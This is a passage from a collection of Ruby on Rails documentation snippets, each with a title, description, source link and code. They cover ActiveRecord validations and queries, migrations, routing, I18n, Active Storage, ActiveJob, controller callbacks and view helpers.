ruby\nCODE:\n```\nconfig.generators do |g|\n  g.orm :active_record, primary_key_type: :uuid\nend\n```\n\n----------------------------------------\n\nTITLE: Overriding to_param method in Rails Model\nDESCRIPTION: Demonstrates how to override the `to_param` method in an ActiveRecord model to use the `identifier` attribute in the URL. This allows you to create more readable and SEO-friendly URLs.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_80\n\nLANGUAGE: ruby\nCODE:\n```\nclass Video < ApplicationRecord\n  def to_param\n    identifier\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Displaying Active Storage Attachments in ERB Template\nDESCRIPTION: This ERB code snippet shows how to display Active Storage attachments in a view, including handling both representable and non-representable files with appropriate fallbacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_53\n\nLANGUAGE: erb\nCODE:\n```\n<ul>\n  <% @message.files.each do |file| %>\n    <li>\n      <% if file.representable? %>\n        <%= image_tag file.representation(resize_to_limit: [100, 100]) %>\n      <% else %>\n        <%= link_to rails_blob_path(file, disposition: \"attachment\") do %>\n          <%= image_tag \"placeholder.png\", alt: \"Download file\" %>\n        <% end %>\n      <% end %>\n    </li>\n  <% end %>\n</ul>\n```\n\n----------------------------------------\n\nTITLE: Using the Uniqueness Validator in a Rails Model (Ruby)\nDESCRIPTION: Illustrates the basic use of the `uniqueness` validator in an ActiveRecord model (`Account`). It ensures that the value of the `email` attribute is unique across all records in the `accounts` table before saving.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\nclass Account < ApplicationRecord\n  validates :email, uniqueness: true\nend\n```\n\n----------------------------------------\n\nTITLE: HAVING Conditions in Rails\nDESCRIPTION: Demonstrates how to use the `having` method to filter grouped results based on a condition applied to the grouped data (e.g., sum of totals greater than a value).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_97\n\nLANGUAGE: ruby\nCODE:\n```\nOrder.select(\"created_at as ordered_date, sum(total) as total_price\").\n  group(\"created_at\").having(\"sum(total) > ?\", 200)\n```\n\n----------------------------------------\n\nTITLE: Adding Column with NOT NULL Constraint (Ruby)\nDESCRIPTION: This migration adds an `email` column to the `users` table and enforces a `NOT NULL` constraint on it.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_25\n\nLANGUAGE: Ruby\nCODE:\n```\nclass AddEmailToUsers < ActiveRecord::Migration[8.1]\n  def change\n    add_column :users, :email, :string, null: false\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: NOT Condition in Rails\nDESCRIPTION: Demonstrates how to use `where.not` to find records that do *not* match a specified condition, in this case, `orders_count` not being in the array [1, 3, 5].\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_70\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where.not(orders_count: [1, 3, 5])\n```\n\n----------------------------------------\n\nTITLE: Redirection with Status Code (Ruby)\nDESCRIPTION: Redirects requests from one path to another with a specified HTTP status code.  This allows using different redirection types, such as a 302 \"Found\" redirect instead of the default 301.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_53\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/stories/:name\", to: redirect(\"/articles/%{name}\", status: 302)\n```\n\n----------------------------------------\n\nTITLE: Generating Video Tag with Multiple Sources in Rails\nDESCRIPTION: This code snippet demonstrates how to use the `video_tag` helper with an array of videos in Rails to generate an HTML5 `<video>` tag with multiple `<source>` elements. This allows the browser to choose the first supported video format.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_61\n\nLANGUAGE: erb\nCODE:\n```\n<%= video_tag [\"trailer.ogg\", \"movie.ogg\"] %>\n```\n\n----------------------------------------\n\nTITLE: Enforcing Presence for Confirmation Attribute in Rails (Ruby)\nDESCRIPTION: Illustrates how to require the confirmation field to be filled by adding a `presence` validation for the `email_confirmation` attribute. This is used in conjunction with the `confirmation` validator for the `email` attribute in a `Person` model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :email, confirmation: true\n  validates :email_confirmation, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Validation Testing in IRB Console\nDESCRIPTION: Shows how to test the Person model's name validation using the valid? method in the Rails console.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_1\n\nLANGUAGE: irb\nCODE:\n```\nirb> Person.new(name: \"John Doe\").valid?\n=> true\nirb> Person.new(name: nil).valid?\n=> false\n```\n\n----------------------------------------\n\nTITLE: Eager Loading Multiple Associations (Nested Hash) in Rails\nDESCRIPTION: This example illustrates how to eager load multiple nested associations using a nested hash with the `includes` method. It loads a customer with ID 1, their associated orders, the books for each order, and the author and supplier for each book.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_152\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.includes(orders: { books: [:supplier, :author] }).find(1)\n```\n\n----------------------------------------\n\nTITLE: Retrieving Filtered Data from Multiple Tables in Rails\nDESCRIPTION: This Ruby code demonstrates method chaining to retrieve filtered data from multiple tables. It selects specific columns from the `customers` and `reviews` tables, joins them based on the `customer_id`, and filters the results to only include reviews created within the last week.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_181\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer\n  .select(\"customers.id, customers.last_name, reviews.body\")\n  .joins(:reviews)\n  .where(\"reviews.created_at > ?\", 1.week.ago)\n```\n\n----------------------------------------\n\nTITLE: Translating and Localizing with Rails I18n API Methods - Ruby\nDESCRIPTION: Demonstrates the main public methods of the Rails I18n API, including how to translate strings and localize dates/times. Shows the usage of method aliases #t and #l via the I18n module for concise invocation. Inputs required are translation key strings or date/time objects, and outputs are the localized strings. No additional dependencies beyond Rails' I18n framework are needed; these methods form the foundation of application internationalization.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\ntranslate # Lookup text translations\nlocalize  # Localize Date and Time objects to local formats\n```\n\nLANGUAGE: ruby\nCODE:\n```\nI18n.t \"store.title\"\nI18n.l Time.now\n```\n\n----------------------------------------\n\nTITLE: Basic Active Record Validation Implementation\nDESCRIPTION: Demonstrates a simple presence validation on a Person model's name attribute using Active Record validations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :name, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Accessing Custom Errors in Rails Console\nDESCRIPTION: This snippet shows how to access custom errors in the Rails console. It demonstrates retrieving the error type and full message for a custom error.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_70\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.new\nirb> person.errors.where(:name).first.type\n=> :too_plain\nirb> person.errors.where(:name).first.full_message\n=> \"Name is not cool enough\"\n```\n\n----------------------------------------\n\nTITLE: Basic Active Record Model Definition\nDESCRIPTION: Shows a basic Person model class definition inheriting from ApplicationRecord for persistence functionality.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\nend\n```\n\n----------------------------------------\n\nTITLE: Validating Attribute Format with Regex in Rails (Ruby)\nDESCRIPTION: Employs the `format` validator in a `Product` model to check if the `legacy_code` attribute matches a given regular expression (`/\\A[a-zA-Z]+\\z/`). This ensures the attribute contains only letters from the beginning (`\\A`) to the end (`\\z`) of the string. A custom error message is provided using the `:message` option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nclass Product < ApplicationRecord\n  validates :legacy_code, format: { with: /\\A[a-zA-Z]+\\z/,\n    message: \"only allows letters\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Setting Custom Configuration Options in Rails\nDESCRIPTION: This snippet shows how to set custom configuration options in a Rails application using the `config.x` namespace and the `config` object. It sets a nested configuration `config.x.payment_processing.schedule` and a single-level configuration `config.super_debugger`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_112\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.x.payment_processing.schedule = :daily\nconfig.x.payment_processing.retries  = 3\nconfig.super_debugger = true\n```\n\n----------------------------------------\n\nTITLE: Configuring Asset Host in Rails Application (Ruby)\nDESCRIPTION: Shows how to configure a dedicated asset server host in a Rails application. Setting `config.asset_host` in configuration files (e.g., `config/environments/production.rb`) directs asset helpers to generate URLs pointing to this host.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.asset_host = \"assets.example.com\"\n```\n\n----------------------------------------\n\nTITLE: Implementing JSON and JSONB Storage in Rails\nDESCRIPTION: Shows how to use PostgreSQL's JSON and JSONB types in Rails applications, including migration setup and querying JSON data.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20131220144913_create_events.rb\n# ... for json datatype:\ncreate_table :events do |t|\n  t.json \"payload\"\nend\n# ... or for jsonb datatype:\ncreate_table :events do |t|\n  t.jsonb \"payload\"\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/event.rb\nclass Event < ApplicationRecord\nend\n```\n\n----------------------------------------\n\nTITLE: Form Partial - ERB\nDESCRIPTION: This ERB snippet defines a partial form for creating and updating products.  It uses local variable `product` instead of instance variable `@product` making it reusable. It expects a `product` object and creates text fields for the `name` attribute and a submit button.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_61\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: product do |form| %>\n  <div>\n    <%= form.label :name %>\n    <%= form.text_field :name %>\n  </div>\n\n  <div>\n    <%= form.submit %>\n  </div>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Passing Arguments to a Scope in Rails\nDESCRIPTION: Illustrates how to define a scope that accepts arguments, allowing for dynamic query construction. This demonstrates a parameterized scope for finding books that cost more than a specified amount.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_163\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  scope :costs_more_than, ->(amount) { where(\"price > ?\", amount) }\nend\n```\n\n----------------------------------------\n\nTITLE: Using errors.where Method to Filter Errors in Rails\nDESCRIPTION: This snippet demonstrates how to use the errors.where method to filter errors by attribute, type, and options. It shows different filtering approaches for retrieving specific error objects.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_65\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.new\nirb> person.valid?\n=> false\n\nirb> person.errors.where(:name)\n=> [ ... ] # all errors for :name attribute\n\nirb> person.errors.where(:name, :too_short)\n=> [ ... ] # :too_short errors for :name attribute\n```\n\n----------------------------------------\n\nTITLE: Defining an Active Record Validation in Ruby\nDESCRIPTION: Defines a validation rule within a `User` model class using the `validates` class method. This specific validation ensures that the `name` attribute must have a value (cannot be blank or nil) before the `User` record can be successfully saved to the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  validates :name, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Binding Form to Model with form_with\nDESCRIPTION: This snippet demonstrates how to bind a form to a model object using the form_with helper in Rails. The `:model` option is used to specify the model object.  Labels and text fields are created for the 'title' and 'author' attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_16\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: @book do |form| %>\n  <div>\n    <%= form.label :title %>\n    <%= form.text_field :title %>\n  </div>\n  <div>\n    <%= form.label :author %>\n    <%= form.text_field :author %>\n  </div>\n  <%= form.submit %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Conditional Callback Execution with :if and :unless in Rails\nDESCRIPTION: This example demonstrates how to use both `:if` and `:unless` conditions in a `before_save` callback within an Active Record model. The callback `filter_content` will only be executed if the `forum.parental_control?` condition is true and the `author.trusted?` condition is false.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nclass Comment < ApplicationRecord\n  before_save :filter_content,\n    if: -> { forum.parental_control? },\n    unless: -> { author.trusted? }\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing has_one and belongs_to Associations in Ruby on Rails\nDESCRIPTION: Demonstrates how to set up a one-to-one relationship between Supplier and Account models using has_one and belongs_to associations. The foreign key is placed in the model declaring the belongs_to association.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_60\n\nLANGUAGE: ruby\nCODE:\n```\nclass Supplier < ApplicationRecord\n  has_one :account\nend\n\nclass Account < ApplicationRecord\n  belongs_to :supplier\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Table with References (Ruby)\nDESCRIPTION: This code snippet shows how to create a `products` table with a foreign key reference to the `categories` table using the `:references` type, which adds a `category_id` column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_27\n\nLANGUAGE: Ruby\nCODE:\n```\ncreate_table :products do |t|\n  t.references :category\nend\n```\n\n----------------------------------------\n\nTITLE: Performing Full-Text Search Queries on Documents - ActiveRecord Usage - Ruby\nDESCRIPTION: Demonstrates the creation of a Document record and querying for documents matching a full-text search ('cat & dog') across the title and body fields. Requires a Ruby environment with Rails and a documents table set up with a to_tsvector index. Inputs include document attributes and the search query term; output is a filtered set of matching documents.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\n# Usage\\nDocument.create(title: \\\"Cats and Dogs\\\", body: \\\"are nice!\\\")\\n\\n## all documents matching 'cat & dog'\\nDocument.where(\\\"to_tsvector('english', title || ' ' || body) @@ to_tsquery(?)\\\",\\n                 \\\"cat & dog\\\")\n```\n\n----------------------------------------\n\nTITLE: Wrapping Application Code with Rails Executor (Ruby)\nDESCRIPTION: Demonstrates how to use the Rails Executor to safely run application code, separating it from framework code. The Executor manages critical environment aspects such as class loading, database connections, and cache management. To use, simply provide a block to the `wrap` method; no external dependencies are needed beyond Rails itself. Expected input is a block containing user or library code to execute. This should be used wherever library-level code invokes application code to ensure thread safety.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/threading_and_code_execution.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.executor.wrap do\n  # call application code here\nend\n```\n\n----------------------------------------\n\nTITLE: Switching Locales per Request with around_action - Ruby\nDESCRIPTION: Implements dynamic locale switching in a Rails application by utilizing around_action and I18n.with_locale in ApplicationController. This pattern sets the locale per request based on params, ensuring locale changes do not leak between threads and requests. Inputs: params[:locale] or default locale; Output: all translations for the request use the chosen locale. This solution is thread/process-safe and essential for multi-locale Rails applications.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\naround_action :switch_locale\n\ndef switch_locale(&action)\n  locale = params[:locale] || I18n.default_locale\n  I18n.with_locale(locale, &action)\nend\n```\n\n----------------------------------------\n\nTITLE: Using `around_action` to Measure Execution Time in Rails\nDESCRIPTION: This snippet demonstrates how to use the `around_action` callback to measure the execution time of a controller action. It defines a `measure_execution_time` method that records the start and end times, calculates the duration, and logs the information using Rails logger. The `yield` keyword executes the action within the callback.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\n  around_action :measure_execution_time\n\n  private\n    def measure_execution_time\n      start_time = Time.now\n      yield  # This executes the action\n      end_time = Time.now\n\n      duration = end_time - start_time\n      Rails.logger.info \"Action #{action_name} from controller #{controller_name} took #{duration.round(2)} seconds to execute.\"\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Testing Jobs in Isolation (Ruby)\nDESCRIPTION: This test demonstrates how to test a job in isolation. It uses `perform_enqueued_jobs` to execute the job immediately and then asserts that the account is charged for the product using `assert account.reload.charged_for?(product)`. It tests `BillingJob.perform_later`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_102\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass BillingJobTest < ActiveJob::TestCase\n  test \"account is charged\" do\n    perform_enqueued_jobs do\n      BillingJob.perform_later(account, product)\n    end\n    assert account.reload.charged_for?(product)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: I18n Configuration Attribute Accessors in Rails - Ruby\nDESCRIPTION: Lists the primary reader and writer attributes available on the Rails I18n module for managing localization behavior. These attributes control paths for translation files, current and default locale, available locales, and backends. All are standard parts of the I18n framework in Rails, and are accessed or modified as module attributes. Prerequisites include Rails and the I18n gem.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nload_path                 # Announce your custom translation files\nlocale                    # Get and set the current locale\ndefault_locale            # Get and set the default locale\navailable_locales         # Permitted locales available for the application\nenforce_available_locales # Enforce locale permission (true or false)\nexception_handler         # Use a different exception_handler\nbackend                   # Use a different backend\n```\n\n----------------------------------------\n\nTITLE: Replacing select and map with pluck in Rails\nDESCRIPTION: Illustrates how `pluck` can simplify code by directly extracting column values into an array, replacing the need for `select` and `map` combinations. This approach avoids creating ActiveRecord objects, improving performance for large queries.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_195\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.select(:id).map { |c| c.id }\n# or\nCustomer.select(:id).map(&:id)\n# or\nCustomer.select(:id, :first_name).map { |c| [c.id, c.first_name] }\n```\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.pluck(:id)\n# or\nCustomer.pluck(:id, :first_name)\n```\n\n----------------------------------------\n\nTITLE: Specifying Conditions on Eager Loaded Associations in Rails\nDESCRIPTION: This snippet demonstrates how to specify conditions on eager loaded associations using the `where` method. It retrieves all authors along with their books that are out of print. This generates a query with a `LEFT OUTER JOIN`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_153\n\nLANGUAGE: ruby\nCODE:\n```\nAuthor.includes(:books).where(books: { out_of_print: true })\n```\n\nLANGUAGE: sql\nCODE:\n```\n  SELECT authors.id AS t0_r0, ... books.updated_at AS t1_r5 FROM authors LEFT OUTER JOIN books ON books.author_id = authors.id WHERE (books.out_of_print = 1)\n```\n\n----------------------------------------\n\nTITLE: Using tag Helper in Rails\nDESCRIPTION: The tag helper generates standalone HTML tags with specified name and options. It can create any HTML tag and supports passing attributes as options, including HTML data-* attributes through the data option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\ntag.h1 \"All titles fit to print\"\n# => <h1>All titles fit to print</h1>\n\ntag.div \"Hello, world!\"\n# => <div>Hello, world!</div>\n```\n\nLANGUAGE: ruby\nCODE:\n```\ntag.section class: %w( kitties puppies )\n# => <section class=\"kitties puppies\"></section>\n```\n\nLANGUAGE: ruby\nCODE:\n```\ntag.div data: { user_id: 123 }\n# => <div data-user-id=\"123\"></div>\n```\n\n----------------------------------------\n\nTITLE: Creating Links with link_to in Ruby on Rails\nDESCRIPTION: Demonstrates various ways to use the link_to helper for creating links, including with models, paths, and custom attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nlink_to \"Profile\", @profile\n# => <a href=\"/profiles/1\">Profile</a>\n\nlink_to \"Book\", @book # given a composite primary key [:author_id, :id]\n# => <a href=\"/books/2_1\">Book</a>\n\nlink_to \"Profiles\", profiles_path\n# => <a href=\"/profiles\">Profiles</a>\n\nlink_to nil, \"https://example.com\"\n# => <a href=\"https://example.com\">https://example.com</a>\n\nlink_to \"Articles\", articles_path, id: \"articles\", class: \"article__container\"\n# => <a href=\"/articles\" class=\"article__container\" id=\"articles\">Articles</a>\n```\n\n----------------------------------------\n\nTITLE: Creating Rails App with Dev Container Support (Bash)\nDESCRIPTION: Uses the `rails-new` tool to generate a new Rails application named 'store' inside a directory also named 'store'. The `--devcontainer` flag specifically adds the necessary configuration files (.devcontainer directory) to the generated application, enabling it to be easily opened and run within a VS Code Dev Container. This command requires the `rails-new` tool and Docker to be installed and operational.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started_with_devcontainer.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ rails-new store --devcontainer\n```\n\n----------------------------------------\n\nTITLE: Find or Create Customer in Rails\nDESCRIPTION: This Ruby code demonstrates the use of `find_or_create_by` to find a customer with the first name 'Andy'. If a customer with that name exists, it returns the existing record. If not, it creates a new customer record with the specified attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_185\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.find_or_create_by(first_name: 'Andy')\n```\n\n----------------------------------------\n\nTITLE: Using Lambdas in Content-Security-Policy Configuration\nDESCRIPTION: This snippet demonstrates how to use lambdas to inject per-request values into the Content-Security-Policy configuration in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_71\n\nLANGUAGE: ruby\nCODE:\n```\nclass PostsController < ApplicationController\n  content_security_policy do |policy|\n    policy.base_uri :self, -> { \"https://#{current_user.domain}.example.com\" }\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Attaching a File to an Existing User Record (Ruby)\nDESCRIPTION: Demonstrates explicit attachment of a file to an existing User avatar using the attach Active Storage API. Expects params[:avatar] to be an uploaded file object. Requires model to have has_one_attached :avatar.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nuser.avatar.attach(params[:avatar])\n```\n\n----------------------------------------\n\nTITLE: Products Controller with Before Action - Ruby\nDESCRIPTION: This Ruby snippet demonstrates the use of a `before_action` to extract common code (`set_product`) that is executed before specified controller actions (`show`, `edit`, `update`). This DRY approach reduces code duplication.  It relies on the `params[:id]` parameter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_60\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  before_action :set_product, only: %i[ show edit update ]\n\n  def index\n    @products = Product.all\n  end\n\n  def show\n  end\n\n  def new\n    @product = Product.new\n  end\n\n  def create\n    @product = Product.new(product_params)\n    if @product.save\n      redirect_to @product\n    else\n      render :new, status: :unprocessable_entity\n    end\n  end\n\n  def edit\n  end\n\n  def update\n    if @product.update(product_params)\n      redirect_to @product\n    else\n      render :edit, status: :unprocessable_entity\n    end\n  end\n\n  private\n    def set_product\n      @product = Product.find(params[:id])\n    end\n\n    def product_params\n      params.expect(product: [ :name ])\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Conditionally Validating Confirmation on Attribute Change in Rails (Ruby)\nDESCRIPTION: Demonstrates applying the `presence` validation for `email_confirmation` conditionally, only when the `email` attribute has changed. This uses the `:if` option with the `email_changed?` method in a `Person` model to optimize validation, avoiding redundant checks when the email hasn't been modified.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :email, confirmation: true\n  validates :email_confirmation, presence: true, if: :email_changed?\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Queue Adapter Per Job in Rails\nDESCRIPTION: This code snippet shows how to configure the queue adapter for a specific Active Job class.  By setting `self.queue_adapter` within the job definition, you can override the globally configured adapter and use a different backend for that particular job. This allows for fine-grained control over job execution.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\nclass GuestsCleanupJob < ApplicationJob\n  self.queue_adapter = :resque\n  # ...\nend\n\n# Now your job will use `resque` as its backend queue adapter, overriding the default Solid Queue adapter.\n```\n\n----------------------------------------\n\nTITLE: Setting Readonly Objects in Active Record (Ruby)\nDESCRIPTION: This snippet demonstrates how to use the `readonly` method to explicitly disallow modification of any of the returned objects. Any attempt to alter a readonly record will raise an `ActiveRecord::ReadOnlyRecord` exception.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_130\n\nLANGUAGE: ruby\nCODE:\n```\ncustomer = Customer.readonly.first\ncustomer.visits += 1\ncustomer.save # Raises an ActiveRecord::ReadOnlyRecord\n```\n\n----------------------------------------\n\nTITLE: Iterate with Custom Batch Size using `find_each` in Ruby\nDESCRIPTION: This snippet demonstrates how to specify the `batch_size` option with `find_each` to control the number of records retrieved in each batch. In this example, records are retrieved in batches of 5000.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.find_each(batch_size: 5000) do |customer|\n  NewsMailer.weekly(customer).deliver_now\nend\n```\n\n----------------------------------------\n\nTITLE: Using `before_action` to Require Login in Rails\nDESCRIPTION: This snippet demonstrates how to use the `before_action` callback in a Rails controller to ensure that a user is logged in before accessing certain actions. It defines a private method `require_login` that redirects to the login page if the user is not logged in, halting the request cycle. This `before_action` is applied to all actions in the controller unless explicitly skipped.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\n  before_action :require_login\n\n  private\n    def require_login\n      unless logged_in?\n        flash[:error] = \"You must be logged in to access this section\"\n        redirect_to new_login_url # halts request cycle\n      end\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Bulk Enqueuing Jobs with perform_all_later in ActiveJob (Ruby)\nDESCRIPTION: This snippet demonstrates how to enqueue multiple `GuestCleanupJob` instances using `perform_all_later`. It showcases the creation of job instances with arguments passed to `new` and subsequently to `perform`, as well as configuring options like `wait` time before enqueuing the jobs in bulk. It uses the ActiveJob framework.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\n# Create jobs to pass to `perform_all_later`.\n# The arguments to `new` are passed on to `perform`\nguest_cleanup_jobs = Guest.all.map { |guest| GuestsCleanupJob.new(guest) }\n\n# Will enqueue a separate job for each instance of `GuestCleanupJob`\nActiveJob.perform_all_later(guest_cleanup_jobs)\n\n# Can also use `set` method to configure options before bulk enqueuing jobs.\nguest_cleanup_jobs = Guest.all.map { |guest| GuestsCleanupJob.new(guest).set(wait: 1.day) }\n\nActiveJob.perform_all_later(guest_cleanup_jobs)\n```\n\n----------------------------------------\n\nTITLE: Using ActiveModel::Attributes for Data Typing\nDESCRIPTION: This snippet demonstrates how to use `ActiveModel::Attributes` to define data types, set default values, and handle casting and serialization on plain Ruby objects. It showcases defining attributes with specific types like string, date, and boolean.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person\n  include ActiveModel::Attributes\n\n  attribute :name, :string\n  attribute :date_of_birth, :date\n  attribute :active, :boolean, default: true\nend\n```\n\n----------------------------------------\n\nTITLE: Custom Local Variable Name in Partial\nDESCRIPTION: This snippet illustrates how to specify a custom local variable name within a partial using the `:as` option. Instead of `product`, the instance of `@products` is accessed as `item` within the partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_91\n\nLANGUAGE: erb\nCODE:\n```\n<%= render partial: \"product\", collection: @products, as: :item %>\n```\n\n----------------------------------------\n\nTITLE: Controller Index Action\nDESCRIPTION: Retrieves all books from the database and assigns them to the `@books` instance variable, making them accessible in the view. No explicit render call relies on convention over configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nclass BooksController < ApplicationController\n  def index\n    @books = Book.all\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Process Customers in Batches Up to a Custom Finish ID using `find_in_batches` in Ruby\nDESCRIPTION: This snippet demonstrates specifying a finishing customer ID (7000) when using `find_in_batches`. This enables processing only records up to a certain ID.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_52\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.find_in_batches(finish: 7000) do |customers|\n  export.add_customers(customers)\nend\n```\n\n----------------------------------------\n\nTITLE: Combining Multiple Validation Conditions in Ruby on Rails\nDESCRIPTION: Shows how to combine multiple conditions for validations using an array. The example demonstrates using both :if and :unless conditions in a single validation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_53\n\nLANGUAGE: 